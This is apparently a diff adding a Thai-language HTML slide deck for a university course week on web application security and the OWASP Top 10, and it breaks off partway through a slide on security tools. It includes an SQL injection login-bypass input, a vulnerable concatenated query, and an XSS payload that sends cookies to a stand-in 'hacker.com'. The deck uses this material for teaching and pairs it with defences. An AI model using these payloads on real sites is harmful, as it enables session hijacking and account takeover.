@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Week 7: Web Application Security & OWASP Overview</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Sarabun:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary: #2563eb; /* Modern Blue */
+            --secondary: #1e293b; /* Slate Dark */
+            --accent: #f59e0b; /* Amber */
+            --danger: #ef4444; /* Red */
+            --success: #10b981; /* Emerald */
+            --bg-dark: #0f172a;
+            --text-light: #f8fafc;
+            --glass: rgba(255, 255, 255, 0.05);
+            --border-glass: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Sarabun', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            overflow: hidden; /* Prevent scrolling */
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* Slide Container 16:9 Aspect Ratio */
+        #presentation-area {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
+        }
+
+        .slide-container {
+            width: 100%;
+            max-width: 1600px; /* Max width constraint */
+            aspect-ratio: 16/9;
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 20px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid var(--border-glass);
+            backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            transition: font-size 0.3s ease;
+        }
+
+        /* Slide Content */
+        .slide {
+            display: none; /* Hidden by default */
+            height: 100%;
+            padding: 4rem 5rem;
+            flex-direction: column;
+            animation: fadeIn 0.5s ease-in-out;
+            position: relative;
+        }
+
+        .slide.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Typography */
+        h1, h2, h3 {
+            font-family: 'Kanit', sans-serif;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            background: linear-gradient(to right, #60a5fa, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+        }
+
+        h2 {
+            font-size: 2.5rem;
+            color: var(--accent);
+            border-bottom: 2px solid var(--border-glass);
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        h3 {
+            font-size: 1.8rem;
+            color: #94a3b8;
+        }
+
+        p, li {
+            font-size: 1.4rem;
+            margin-bottom: 1rem;
+            color: #cbd5e1;
+        }
+
+        ul {
+            padding-left: 2rem;
+        }
+        
+        strong {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Infographic Elements */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            height: 100%;
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 1.5rem;
+        }
+
+        .card {
+            background: var(--glass);
+            border: 1px solid var(--border-glass);
+            padding: 1.5rem;
+            border-radius: 12px;
+            transition: transform 0.3s;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .icon-box {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            display: block;
+            text-align: center;
+        }
+
+        .number-badge {
+            background: var(--primary);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .code-block {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: 'Consolas', monospace;
+            font-size: 1.1rem;
+            overflow-x: auto;
+            border-left: 5px solid var(--accent);
+            margin: 1rem 0;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
+        }
+
+        .warning-box {
+            background: rgba(239, 68, 68, 0.1);
+            border-left: 5px solid var(--danger);
+            padding: 1rem;
+            margin-top: 1rem;
+            color: #fca5a5;
+        }
+        
+        .success-box {
+            background: rgba(16, 185, 129, 0.1);
+            border-left: 5px solid var(--success);
+            padding: 1rem;
+            margin-top: 1rem;
+            color: #6ee7b7;
+        }
+
+        /* Controls */
+        .controls {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 1rem;
+            z-index: 1000;
+            background: rgba(15, 23, 42, 0.9);
+            padding: 10px 20px;
+            border-radius: 50px;
+            border: 1px solid var(--border-glass);
+        }
+
+        .btn {
+            background: var(--secondary);
+            color: white;
+            border: 1px solid var(--border-glass);
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-family: 'Kanit', sans-serif;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .btn:hover {
+            background: var(--primary);
+            transform: scale(1.05);
+        }
+
+        .progress-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 5px;
+            background: var(--primary);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .slide-number {
+            position: absolute;
+            bottom: 20px;
+            right: 30px;
+            font-family: 'Kanit', sans-serif;
+            opacity: 0.5;
+            font-size: 1rem;
+        }
+
+        /* Specific Infographics */
+        .cia-triad {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 2rem;
+        }
+        .cia-item {
+            text-align: center;
+            width: 200px;
+        }
+        
+        .vs-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 1rem;
+        }
+        .vs-table th, .vs-table td {
+            border: 1px solid var(--border-glass);
+            padding: 15px;
+            text-align: left;
+        }
+        .vs-table th {
+            background: rgba(255,255,255,0.1);
+            color: var(--accent);
+        }
+
+    </style>
+</head>
+<body>
+
+<div id="presentation-area">
+    <div class="slide-container" id="slideContainer">
+        
+        <div class="slide active">
+            <div style="display: flex; flex-direction: column; justify-content: center; height: 100%; text-align: center;">
+                <h3 style="color: var(--accent);">ENGSE214 – ความมั่นคงปลอดภัยทางไซเบอร์เบื้องต้น</h3>
+                <h1>Week 7: Web Application Security<br>& OWASP Overview</h1>
+                <div style="margin-top: 3rem; font-size: 1.5rem;">
+                    <p><i class="fas fa-chalkboard-teacher"></i> โดย อาจารย์ผู้สอน</p>
+                    <p style="color: #94a3b8;">สาขาวิชาวิศวกรรมซอฟต์แวร์<br>มหาวิทยาลัยเทคโนโลยีราชมงคลล้านนา</p>
+                </div>
+                <div style="margin-top: 2rem;">
+                    <span style="background: var(--glass); padding: 10px 20px; border-radius: 20px; border: 1px solid var(--accent); color: var(--accent);">
+                        <i class="fas fa-clock"></i> เวลาเรียน: 3 ชั่วโมง
+                    </span>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-list-ul"></i> หัวข้อการเรียนรู้ (Agenda)</h2>
+            <div class="grid-2">
+                <div class="card">
+                    <h3 style="color: var(--success);"><i class="fas fa-history"></i> Part 1: Review</h3>
+                    <ul>
+                        <li>ทบทวน Week 6: Cryptography Basics</li>
+                        <li>ความสำคัญของการเข้ารหัสกับ Web Security</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h3 style="color: var(--danger);"><i class="fas fa-shield-alt"></i> Part 2: Web Security</h3>
+                    <ul>
+                        <li>ความสำคัญของ Web App Security</li>
+                        <li>สถิติและการโจมตีในปัจจุบัน</li>
+                        <li>CIA Triad ในมุมมองของเว็บ</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h3 style="color: var(--primary);"><i class="fas fa-globe"></i> Part 3: OWASP Top 10</h3>
+                    <ul>
+                        <li>รู้จักองค์กร OWASP</li>
+                        <li>เจาะลึก 10 ช่องโหว่ยอดฮิต (2021)</li>
+                        <li>Demo & Case Studies</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h3 style="color: var(--accent);"><i class="fas fa-flask"></i> Part 4: Lab & Assessment</h3>
+                    <ul>
+                        <li>แนะนำเครื่องมือ (Burp Suite, ZAP)</li>
+                        <li>Lab 3 Description</li>
+                        <li>เกณฑ์การให้คะแนน</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-sync-alt"></i> ทบทวน Week 6: Cryptography Basics</h2>
+            <div style="text-align: center; margin-bottom: 2rem;">
+                <h3>"การเข้ารหัสคือรากฐานของความเชื่อถือบนโลกดิจิทัล"</h3>
+            </div>
+            <div class="grid-3">
+                <div class="card" style="text-align: center;">
+                    <div class="icon-box" style="color: #e879f9;"><i class="fas fa-key"></i></div>
+                    <h4>Symmetric Encryption</h4>
+                    <p>AES, DES</p>
+                    <p class="warning-box" style="font-size: 1rem;">เร็ว แต่มีปัญหาการแจก Key</p>
+                </div>
+                <div class="card" style="text-align: center;">
+                    <div class="icon-box" style="color: #38bdf8;"><i class="fas fa-user-lock"></i></div>
+                    <h4>Asymmetric Encryption</h4>
+                    <p>RSA, ECC</p>
+                    <p class="success-box" style="font-size: 1rem;">Public/Private Key แก้ปัญหา Key Distribution</p>
+                </div>
+                <div class="card" style="text-align: center;">
+                    <div class="icon-box" style="color: #fbbf24;"><i class="fas fa-fingerprint"></i></div>
+                    <h4>Hash Functions</h4>
+                    <p>SHA-256, MD5</p>
+                    <p style="font-size: 1rem; color: #cbd5e1;">One-way function เพื่อตรวจสอบ Integrity</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-certificate"></i> Digital Certificates & PKI</h2>
+            <div class="grid-2">
+                <div>
+                    <ul>
+                        <li><strong>PKI (Public Key Infrastructure):</strong> โครงสร้างพื้นฐานที่ทำให้เราเชื่อถือ Key สาธารณะได้</li>
+                        <li><strong>Digital Certificate:</strong> เปรียบเสมือน "บัตรประชาชนออนไลน์" ของเว็บไซต์</li>
+                        <li><strong>CA (Certificate Authority):</strong> หน่วยงานกลางที่ออกใบรับรอง</li>
+                    </ul>
+                    <div class="success-box">
+                        <i class="fas fa-check-circle"></i> ผลลัพธ์: ทำให้เกิด <strong>HTTPS</strong> (Green Lock) บน Browser
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: center; align-items: center;">
+                    <div style="font-size: 8rem; color: var(--success); text-shadow: 0 0 20px var(--success);">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-link"></i> ความเชื่อมโยงสู่ Week 7</h2>
+            <div style="display: flex; align-items: center; justify-content: center; gap: 2rem; margin-top: 2rem;">
+                <div class="card" style="width: 40%;">
+                    <h3>Week 6: Network/Data</h3>
+                    <p>Cryptography ปกป้องข้อมูลระหว่างการเดินทาง (Data in Transit)</p>
+                    <p style="color: var(--success);">✅ Hacker ดักจับข้อมูลไม่ได้ (Sniffing ยาก)</p>
+                </div>
+                <div style="font-size: 3rem; color: var(--danger);"><i class="fas fa-arrow-right"></i></div>
+                <div class="card" style="width: 40%; border-color: var(--danger);">
+                    <h3>Week 7: Application</h3>
+                    <p>แต่ถ้า <strong>Web Application</strong> มีช่องโหว่?</p>
+                    <p style="color: var(--danger);">❌ Hacker ไม่ต้องดักจับ แต่ขอข้อมูลจาก App ตรงๆ!</p>
+                </div>
+            </div>
+            <div class="warning-box" style="text-align: center; font-size: 1.5rem; margin-top: 3rem;">
+                "HTTPS ไม่ได้แปลว่าเว็บไซต์นั้นปลอดภัยจากการถูกเจาะระบบ"
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-bullseye"></i> วัตถุประสงค์การเรียนรู้ (Week 7)</h2>
+            <div class="grid-2">
+                <div>
+                    <ul>
+                        <li><span class="number-badge">1</span> เข้าใจความสำคัญของ Web Application Security</li>
+                        <li><span class="number-badge">2</span> อธิบายหลักการ CIA Triad ในบริบทของ Web App</li>
+                        <li><span class="number-badge">3</span> รู้จักองค์กร OWASP และ Top 10 Risks</li>
+                        <li><span class="number-badge">4</span> วิเคราะห์และป้องกันช่องโหว่หลัก (Injection, XSS, Broken Access)</li>
+                    </ul>
+                </div>
+                <div>
+                    <ul>
+                        <li><span class="number-badge">5</span> ใช้งานเครื่องมือตรวจสอบความปลอดภัยเบื้องต้น (Burp Suite, ZAP)</li>
+                        <li><span class="number-badge">6</span> ประยุกต์ใช้ Secure Coding Practices</li>
+                    </ul>
+                    <div class="card" style="margin-top: 2rem; background: rgba(59, 130, 246, 0.1);">
+                        <i class="fas fa-graduation-cap"></i> <strong>CLO Connection:</strong><br>
+                        สอดคล้องกับ CLO2 (Vulnerability Assessment) และ CLO3 (Secure Design)
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-chart-line"></i> สถิติที่น่าตกใจ (Statistics)</h2>
+            <div class="grid-3" style="margin-top: 3rem;">
+                <div class="card" style="text-align: center;">
+                    <h1 style="color: var(--danger); font-size: 5rem;">43%</h1>
+                    <p>ของการโจมตีทางไซเบอร์ทั้งหมด<br>พุ่งเป้าไปที่ <strong>Web Applications</strong></p>
+                </div>
+                <div class="card" style="text-align: center;">
+                    <h1 style="color: var(--accent); font-size: 5rem;">94%</h1>
+                    <p>ของเว็บไซต์ที่ถูกตรวจสอบ<br>พบว่ามี <strong>ช่องโหว่อย่างน้อย 1 จุด</strong></p>
+                </div>
+                <div class="card" style="text-align: center;">
+                    <h1 style="color: var(--primary); font-size: 5rem;">300%</h1>
+                    <p>อัตราการเพิ่มขึ้นของการโจมตี<br>Web App ในปี 2024</p>
+                </div>
+            </div>
+            <p style="text-align: right; margin-top: 2rem; font-size: 1rem; color: #64748b;">*อ้างอิงจากรายงานความปลอดภัยไซเบอร์ประจำปี</p>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-bomb"></i> ผลกระทบจากช่องโหว่ (Impact)</h2>
+            <div class="grid-2">
+                <div class="card">
+                    <h3 style="color: var(--primary);"><i class="fas fa-building"></i> ต่อองค์กร (Organization)</h3>
+                    <ul>
+                        <li><strong>Data Breach:</strong> ข้อมูลลูกค้าหลุด (ผิด PDPA/GDPR)</li>
+                        <li><strong>Reputation:</strong> เสียชื่อเสียงและความน่าเชื่อถือ</li>
+                        <li><strong>Financial:</strong> ค่าปรับ ค่าเสียหาย และรายได้ที่หายไป</li>
+                        <li><strong>Legal:</strong> การถูกฟ้องร้องทางกฎหมาย</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h3 style="color: var(--accent);"><i class="fas fa-user-injured"></i> ต่อผู้ใช้งาน (Users)</h3>
+                    <ul>
+                        <li><strong>Identity Theft:</strong> การสวมรอยตัวตน</li>
+                        <li><strong>Financial Loss:</strong> เงินในบัญชีสูญหาย</li>
+                        <li><strong>Privacy:</strong> ข้อมูลส่วนตัวถูกเผยแพร่</li>
+                        <li><strong>Malware:</strong> เครื่องติดไวรัสผ่านเว็บ</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-shield-alt"></i> CIA Triad ในมุมมอง Web Security</h2>
+            <div class="cia-triad">
+                <div class="card cia-item">
+                    <div style="font-size: 3rem; color: var(--primary); margin-bottom: 1rem;"><i class="fas fa-lock"></i></div>
+                    <h4 style="color: var(--primary);">Confidentiality</h4>
+                    <p style="font-size: 1rem;">"ความลับ"</p>
+                    <hr style="border-color: var(--border-glass); margin: 10px 0;">
+                    <p style="font-size: 0.9rem;">Login, Cookie Secure, HTTPS, Data Encryption</p>
+                </div>
+                <div class="card cia-item">
+                    <div style="font-size: 3rem; color: var(--success); margin-bottom: 1rem;"><i class="fas fa-file-signature"></i></div>
+                    <h4 style="color: var(--success);">Integrity</h4>
+                    <p style="font-size: 1rem;">"ความถูกต้อง"</p>
+                    <hr style="border-color: var(--border-glass); margin: 10px 0;">
+                    <p style="font-size: 0.9rem;">Input Validation, Checksums, ป้องกันการแก้ไข Data</p>
+                </div>
+                <div class="card cia-item">
+                    <div style="font-size: 3rem; color: var(--accent); margin-bottom: 1rem;"><i class="fas fa-server"></i></div>
+                    <h4 style="color: var(--accent);">Availability</h4>
+                    <p style="font-size: 1rem;">"ความพร้อมใช้"</p>
+                    <hr style="border-color: var(--border-glass); margin: 10px 0;">
+                    <p style="font-size: 0.9rem;">DDoS Protection, Load Balancing, Uptime</p>
+                </div>
+            </div>
+            <div style="text-align: center; margin-top: 2rem;">
+                <p>การโจมตีเว็บส่วนใหญ่พยายามทำลายองค์ประกอบใดองค์ประกอบหนึ่งใน 3 ข้อนี้</p>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-globe-americas"></i> OWASP คืออะไร?</h2>
+            <div style="display: flex; align-items: center; gap: 3rem;">
+                <div style="flex: 1;">
+                    <h1 style="font-size: 4rem;">OWASP</h1>
+                    <h3 style="color: var(--text-light);">Open Web Application Security Project</h3>
+                    <p style="margin-top: 2rem;">ชุมชนออนไลน์ระดับโลกที่มุ่งเน้นการปรับปรุงความปลอดภัยของซอฟต์แวร์ เป็นองค์กรไม่แสวงหาผลกำไร (Non-profit)</p>
+                    <div class="card" style="margin-top: 2rem;">
+                        <strong><i class="fas fa-star"></i> พันธกิจ:</strong> "ทำให้ความปลอดภัยของแอปพลิเคชันเป็นสิ่งที่มองเห็นได้ เพื่อให้องค์กรสามารถตัดสินใจเรื่องความเสี่ยงได้อย่างถูกต้อง"
+                    </div>
+                </div>
+                <div style="flex: 1; display: flex; justify-content: center;">
+                    <i class="fas fa-bug" style="font-size: 15rem; color: var(--primary); opacity: 0.8;"></i>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-list-ol"></i> OWASP Top 10 (2021 Version)</h2>
+            <p>10 อันดับความเสี่ยงด้านความปลอดภัยของเว็บแอปพลิเคชันที่สำคัญที่สุด</p>
+            <div class="grid-2" style="font-size: 1.2rem;">
+                <ul>
+                    <li><strong style="color: var(--danger);">A01: Broken Access Control</strong> ⬆️ (ขึ้นจากอันดับ 5)</li>
+                    <li><strong style="color: var(--danger);">A02: Cryptographic Failures</strong> ⬆️ (เดิมคือ Sensitive Data Exposure)</li>
+                    <li><strong style="color: var(--danger);">A03: Injection</strong> ⬇️ (รวม XSS ไว้ด้วยบางส่วน)</li>
+                    <li><strong>A04: Insecure Design</strong> 🆕 (ของใหม่!)</li>
+                    <li><strong>A05: Security Misconfiguration</strong></li>
+                </ul>
+                <ul>
+                    <li><strong>A06: Vulnerable and Outdated Components</strong></li>
+                    <li><strong>A07: Identification and Authentication Failures</strong></li>
+                    <li><strong>A08: Software and Data Integrity Failures</strong> 🆕</li>
+                    <li><strong>A09: Security Logging and Monitoring Failures</strong></li>
+                    <li><strong>A10: Server-Side Request Forgery (SSRF)</strong> 🆕</li>
+                </ul>
+            </div>
+            <div class="warning-box" style="text-align: center; margin-top: 1rem;">
+                เราจะโฟกัสที่ตัวหลักๆ ที่พบบ่อยที่สุดในการพัฒนา Software
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><span class="number-badge" style="background:var(--danger)">A01</span> Broken Access Control</h2>
+            <div class="grid-2">
+                <div>
+                    <h3><i class="fas fa-question-circle"></i> คืออะไร?</h3>
+                    <p>การที่ระบบอนุญาตให้ผู้ใช้ทำในสิ่งที่ <strong>"ไม่มีสิทธิ์ทำ"</strong></p>
+                    <ul>
+                        <li>User ทั่วไปเข้าหน้า Admin ได้</li>
+                        <li>User A ดูข้อมูลของ User B ได้ (IDOR)</li>
+                        <li>เข้าถึง API ที่ไม่ได้ป้องกัน</li>
+                    </ul>
+                </div>
+                <div>
+                    <h3><i class="fas fa-code"></i> ตัวอย่าง (Insecure Direct Object Reference)</h3>
+                    <div class="code-block">
+                        // URL ที่ไม่ปลอดภัย<br>
+                        https://example.com/app/accountInfo?acct=NOT_MY_ACCOUNT
+                    </div>
+                    <p class="warning-box">ถ้าเปลี่ยน ID แล้วดูข้อมูลคนอื่นได้ = พัง!</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-shield-virus"></i> การป้องกัน Broken Access Control</h2>
+            <div class="grid-2">
+                <div class="card">
+                    <h3><i class="fas fa-times-circle" style="color: var(--danger);"></i> Don't</h3>
+                    <ul>
+                        <li>เชื่อค่า Parameter ที่ส่งมาจาก Client (เช่น ID) โดยไม่ตรวจสอบ</li>
+                        <li>ซ่อนปุ่ม Admin แล้วคิดว่า User จะหาไม่เจอ (Security by Obscurity)</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h3><i class="fas fa-check-circle" style="color: var(--success);"></i> Do</h3>
+                    <ul>
+                        <li><strong>Deny by Default:</strong> ปิดทุกอย่างก่อน แล้วค่อยเปิดสิทธิ์</li>
+                        <li>ตรวจสอบสิทธิ์ (Authorization) ทุกครั้งที่มีการเรียกข้อมูล</li>
+                        <li>ใช้ Indirect Reference (เช่น Map ID หรือ UUID) แทน Database ID ตรงๆ</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><span class="number-badge" style="background:var(--danger)">A03</span> Injection</h2>
+            <p>เกิดขึ้นเมื่อข้อมูลที่ไม่น่าเชื่อถือ (Untrusted Data) ถูกส่งไปยัง Interpreter ในรูปแบบของคำสั่ง</p>
+            <div style="display: flex; justify-content: center; margin: 2rem 0;">
+                <div style="background: white; padding: 2rem; border-radius: 10px; color: black; display: flex; align-items: center; gap: 1rem;">
+                    <div>User Input</div>
+                    <i class="fas fa-arrow-right"></i>
+                    <div style="color: red;">Malicious Code</div>
+                    <i class="fas fa-arrow-right"></i>
+                    <div style="border: 2px solid black; padding: 10px;">Database / System</div>
+                    <i class="fas fa-bomb" style="color: red; font-size: 2rem;"></i>
+                </div>
+            </div>
+            <p style="text-align: center;">ที่พบบ่อยที่สุดคือ <strong>SQL Injection (SQLi)</strong></p>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-database"></i> SQL Injection (SQLi)</h2>
+            <div class="grid-2">
+                <div>
+                    <h3>Vulnerable Code (Java/PHP/Node)</h3>
+                    <div class="code-block" style="color: #fca5a5;">
+                        String query = "SELECT * FROM users WHERE user = '" + userName + "'";
+                    </div>
+                    <p>ถ้า User กรอก: <code>admin' --</code></p>
+                </div>
+                <div>
+                    <h3>Result Query</h3>
+                    <div class="code-block">
+                        SELECT * FROM users WHERE user = 'admin' --'
+                    </div>
+                    <p class="warning-box">
+                        ระบบจะ Log in เข้าเป็น Admin โดยไม่ต้องใส่ Password! (เพราะ -- คือการ Comment ตัดหางทิ้ง)
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-tools"></i> การป้องกัน SQL Injection</h2>
+            <h3 style="color: var(--success);">ทางออกที่ดีที่สุด: Prepared Statements (Parameterized Queries)</h3>
+            <div class="code-block" style="border-left-color: var(--success);">
+                // Java Example<br>
+                String query = "SELECT * FROM users WHERE user = ?";<br>
+                PreparedStatement pstmt = connection.prepareStatement(query);<br>
+                pstmt.setString(1, userName); // ข้อมูลถูกมองว่าเป็นแค่ Text ไม่ใช่ Code
+            </div>
+            <div class="grid-2" style="margin-top: 1rem;">
+                <ul>
+                    <li>✅ ใช้ ORM (Hibernate, Entity Framework)</li>
+                    <li>✅ Input Validation (ตรวจสอบประเภทข้อมูล)</li>
+                </ul>
+                <ul>
+                    <li>✅ Principle of Least Privilege (DB User ไม่ควรเป็น Root)</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><span class="number-badge" style="background:var(--accent)">A03</span> Cross-Site Scripting (XSS)</h2>
+            <p>เดิมอยู่ใน A07 (2017) ตอนนี้รวมอยู่ใน Injection</p>
+            <div class="card" style="margin-top: 1rem;">
+                <h3><i class="fas fa-bug"></i> Concept</h3>
+                <p>คนร้ายฝังสคริปต์ (JavaScript) ลงในหน้าเว็บ เพื่อให้ไปรันที่เครื่องของเหยื่อ (Browser)</p>
+            </div>
+            <div class="grid-3" style="margin-top: 1rem;">
+                <div class="card">
+                    <h4>Reflected XSS</h4>
+                    <p>มากับ URL Link หลอกให้คลิก</p>
+                </div>
+                <div class="card">
+                    <h4>Stored XSS</h4>
+                    <p>ฝังใน Database (เช่น คอมเมนต์, กระทู้) อันตรายสุด!</p>
+                </div>
+                <div class="card">
+                    <h4>DOM XSS</h4>
+                    <p>เกิดที่ JavaScript ฝั่ง Client</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-code"></i> ตัวอย่างการโจมตี XSS</h2>
+            <p>ถ้าเว็บไซต์แสดงผลข้อมูลที่ User กรอกโดยไม่กรอง...</p>
+            <div class="code-block">
+                // Hacker กรอกในช่อง Comment:<br>
+                &lt;script&gt;<br>
+                  fetch('http://hacker.com/steal?cookie=' + document.cookie);<br>
+                &lt;/script&gt;
+            </div>
+            <div style="margin-top: 2rem;">
+                <h3><i class="fas fa-exclamation-triangle"></i> ผลกระทบ:</h3>
+                <ul>
+                    <li>ขโมย Session Cookie (Session Hijacking) -> ยึด Account</li>
+                    <li>Redirect ไปเว็บปลอม (Phishing)</li>
+                    <li>Deface หน้าเว็บ</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-notes-medical"></i> การป้องกัน XSS</h2>
+            <div class="grid-2">
+                <div class="card">
+                    <h3>1. Output Encoding</h3>
+                    <p>แปลงอักขระพิเศษให้เป็น HTML Entities ก่อนแสดงผล</p>
+                    <div class="code-block">
+                        &lt;script&gt;  -->  &amp;lt;script&amp;gt;
+                    </div>
+                    <p>Browser จะแสดงข้อความแต่ไม่รันโค้ด</p>
+                </div>
+                <div class="card">
+                    <h3>2. Input Validation</h3>
+                    <p>อนุญาตเฉพาะสิ่งที่ปลอดภัย (Allowlisting)</p>
+                </div>
+            </div>
+            <div class="card" style="margin-top: 1rem; border-color: var(--primary);">
+                <h3>3. Content Security Policy (CSP)</h3>
+                <p>กำหนด Header เพื่อบอก Browser ว่าให้โหลด Script จากที่ไหนได้บ้าง</p>
+                <code style="color: var(--accent);">Content-Security-Policy: default-src 'self';</code>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><span class="number-badge" style="background:var(--danger)">A02</span> Cryptographic Failures</h2>
+            <p>ความล้มเหลวในการปกป้องข้อมูลสำคัญ (Sensitive Data)</p>
+            <div class="vs-table-container">
+                <table class="vs-table">
+                    <tr>
+                        <th>ปัญหาที่พบบ่อย</th>
+                        <th>วิธีแก้ไข</th>
+                    </tr>
+                    <tr>
+                        <td>ส่งข้อมูลเป็น Plaintext (HTTP)</td>
+                        <td>บังคับใช้ <strong>HTTPS (TLS)</strong> ทั่วทั้งเว็บ</td>
+                    </tr>
+                    <tr>
+                        <td>เก็บรหัสผ่านเป็นตัวอักษรปกติ</td>
+                        <td>ใช้ <strong>Hash + Salt</strong> (Argon2, bcrypt)</td>
+                    </tr>
+                    <tr>
+                        <td>ใช้ Algorithm เก่า (MD5, SHA1)</td>
+                        <td>อัปเดตไปใช้ SHA-256 หรือใหม่กว่า</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><span class="number-badge" style="background:var(--danger)">A07</span> Identification & Auth Failures</h2>
+            <p>ระบบยืนยันตัวตนอ่อนแอ ทำให้ Hacker สวมรอยได้</p>
+            <div class="grid-2">
+                <div class="card">
+                    <h3><i class="fas fa-skull-crossbones"></i> Weakness</h3>
+                    <ul>
+                        <li>อนุญาตให้ตั้งรหัสผ่านง่าย (123456)</li>
+                        <li>ไม่มีการป้องกัน Brute Force</li>
+                        <li>Session ไม่หมดอายุ (Logout แล้วกด Back กลับมาได้)</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h3><i class="fas fa-user-shield"></i> Best Practices</h3>
+                    <ul>
+                        <li><strong>MFA (Multi-Factor Authentication)</strong> สำคัญมาก!</li>
+                        <li>กำหนด Password Policy ที่แข็งแรง</li>
+                        <li>จำกัดจำนวนครั้งการ Login ผิด (Rate Limiting)</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="slide">
+            <h2><span class="number-badge" style="background:var(--secondary)">A09</span> Security Logging Failures</h2>
+            <div style="text-align: center; margin: 2rem;">
+                <h1>"คุณจะรู้ได้อย่างไรว่าถูกแฮก... ถ้าคุณไม่บันทึกอะไรเลย?"</h1>
+            </div>
+            <ul>
+                <li><strong>ปัญหา:</strong> ไม่เก็บ Log การ Login ที่ผิดพลาด หรือเก็บแต่ไม่ดู</li>
+                <li><strong>ความเสี่ยง:</strong> Hacker เจาะระบบได้นานเป็นเดือนโดยไม่มีใครรู้ (Average breach detection time: 200+ days)</li>
+                <li><strong>แนวทาง:</strong> Centralized Log Management + Alert เมื่อเจอเหตุการณ์ผิดปกติ</li>
+            </ul>
+        </div>
+
+        <div class="slide">
+            <h2><i class="fas fa-toolbox"></i> Web Security Tools</h2>
+            <p>เครื่องมือที่ Software Engineer และ Pentester ต้องรู้จัก</p>
+            <div class="grid-3" style="margin-top: 2rem;">
+                <div class="card" style="text-align: center;">
+                    <i class="fas fa-ghost" style="font-size: 3rem; color: #ff6633;"></i>
+                    <h3>Burp Suite</h3>
+                    <p>The Standard. ใช้ดักจับและแก้ไข Request/Response (Proxy)</p>
+                </div>
